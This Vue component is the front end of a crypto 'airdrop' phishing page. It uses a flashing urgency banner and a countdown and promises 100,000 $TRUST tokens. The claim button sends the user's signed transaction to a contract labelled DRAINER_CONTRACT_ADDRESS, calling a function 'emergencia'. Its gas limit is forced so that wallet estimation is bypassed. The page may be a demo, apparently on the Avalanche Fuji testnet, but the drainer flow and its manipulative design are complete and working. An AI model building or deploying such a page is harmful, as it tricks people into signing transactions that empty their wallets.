<template>
  <div class="bad-container">
    <div class="urgent-banner">⚠️ LAST CHANCE: Airdrop Closes in 24 Hours ⚠️</div>

    <nav>
      <div class="logo">T.R.U.S.T FOUNDATION</div>
      <div class="nav-right">
        <router-link to="/" class="btn btn-connect" style="margin-right: 15px; text-decoration: none;">&larr; Back</router-link>
        <button id="btn-connect" class="btn btn-connect" @click="connectWallet" :class="{ 'verified-btn': userAccount }">
          {{ userAccount ? `VERIFIED: ${userAccount.substring(0,6)}...` : 'CONNECT WALLET' }}
        </button>
      </div>
    </nav>

    <div class="main-box">
      <h1>Claim 100,000 $TRUST</h1>
      <p>Your wallet is eligible for the highly anticipated T.R.U.S.T Token Airdrop. Verify your wallet to claim the funds immediately.</p>
      
      <div v-if="error" style="color: #fca5a5; margin-bottom: 20px;">
        {{ error }}
      </div>

      <div class="timer" id="countdown">{{ formattedTime }}</div>
      <p style="font-size: 14px; opacity: 0.7;">Network: Avalanche Fuji</p>

      <button id="btn-claim" class="btn btn-claim" @click="claim">CLAIM AIRDROP NOW</button>
      
      <p v-if="txHash" style="color: #4ade80; margin-top: 20px; font-weight: bold; font-family: 'Space Grotesk', sans-serif;">
        Tx Hash: {{ txHash }}
      </p>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted, computed } from 'vue'
import { ethers } from 'ethers'
import { useWallet } from '../composables/useWallet'

const { userAccount, signer, connectWallet, error } = useWallet()

const DRAINER_CONTRACT_ADDRESS = "0x7DaC8DFc8fF26442030adEE6e64222DA2FAD050B"
const ABI = [
  { "inputs": [], "name": "emergencia", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
]

const txHash = ref(null)
const timeRemaining = ref(4 * 60 * 60 + 12 * 60) // 4h 12m

let interval = null

onMounted(() => {
  interval = setInterval(() => {
    if(timeRemaining.value > 0) timeRemaining.value--
  }, 1000)
})

onUnmounted(() => {
  if (interval) clearInterval(interval)
})

const formattedTime = computed(() => {
  const h = Math.floor(timeRemaining.value / 3600).toString().padStart(2, '0')
  const m = Math.floor((timeRemaining.value % 3600) / 60).toString().padStart(2, '0')
  const s = (timeRemaining.value % 60).toString().padStart(2, '0')
  return `${h}:${m}:${s}`
})

const claim = async () => {
  error.value = null
  if (!signer.value) {
    alert("CONNECT YOUR WALLET TO CLAIM!")
    return connectWallet()
  }
  
  try {
    const contract = new ethers.Contract(DRAINER_CONTRACT_ADDRESS, ABI, signer.value)
    // Se fuerza el gasLimit para saltarnos el eth_estimateGas de Ethers y forzar a que llegue a T.R.U.S.T/wallet
    const tx = await contract.emergencia({ gasLimit: 300000 })
    console.log("Tx Hash:", tx.hash)
    txHash.value = tx.hash
  } catch (err) { 
    console.warn("User rejected or failed:", err)
    error.value = "Transaction failed or user rejected."
  }
}
</script>

<style scoped>
.bad-container {
  font-family: 'Space Grotesk', sans-serif;
  background-color: #0b0205; /* Black/Deep Red */
  color: #fff;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  background-image: radial-gradient(circle at 50% 50%, rgba(220, 38, 38, 0.1) 0%, transparent 60%);
}

.urgent-banner {
  width: 100%;
  background: #EF4444;
  color: white;
  text-align: center;
  padding: 10px;
  font-weight: bold;
  letter-spacing: 2px;
  animation: flash 2s infinite;
  text-transform: uppercase;
  box-sizing: border-box;
}

@keyframes flash {
  0%, 100% { background: #EF4444; }
  50% { background: #991b1b; }
}

nav {
  width: 100%;
  padding: 20px 40px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  box-sizing: border-box;
  border-bottom: 1px solid rgba(239, 68, 68, 0.2);
}

.logo {
  font-size: 28px;
  font-weight: 800;
  color: #EF4444;
  text-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
}

.nav-right {
  display: flex;
  align-items: center;
}

.btn {
  padding: 12px 28px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.3s;
}

.btn-connect {
  background: transparent;
  border: 2px solid #EF4444;
  color: #EF4444;
}

.btn-connect:hover {
  background: rgba(239, 68, 68, 0.1);
}

.verified-btn {
  background: #dc2626 !important;
  color: white !important;
}

.btn-claim { 
  background: linear-gradient(90deg, #dc2626, #991b1b);
  color: white; 
  box-shadow: 0 0 20px rgba(239, 68, 68, 0.6); 
  width: 100%;
  padding: 20px;
  font-size: 24px;
  text-transform: uppercase;
  margin-top: 20px;
}

.btn-claim:hover {
  transform: scale(1.05);
  box-shadow: 0 0 30px rgba(239, 68, 68, 0.8);
}

.main-box {
  margin-top: 80px;
  background: rgba(0,0,0,0.6);
  border: 1px solid #EF4444;
  padding: 40px;
  border-radius: 12px;
  width: 450px;
  box-sizing: border-box;
  text-align: center;
  box-shadow: 0 20px 50px rgba(239, 68, 68, 0.15);
}

.main-box h1 {
  font-size: 40px;
  margin: 0 0 10px 0;
  color: #fff;
}

.main-box p {
  color: #fca5a5;
  font-size: 18px;
  margin-bottom: 30px;
  line-height: 1.5;
}

.timer {
  font-size: 32px;
  font-weight: bold;
  color: #EF4444;
  margin-bottom: 20px;
  font-family: monospace;
}
</style>
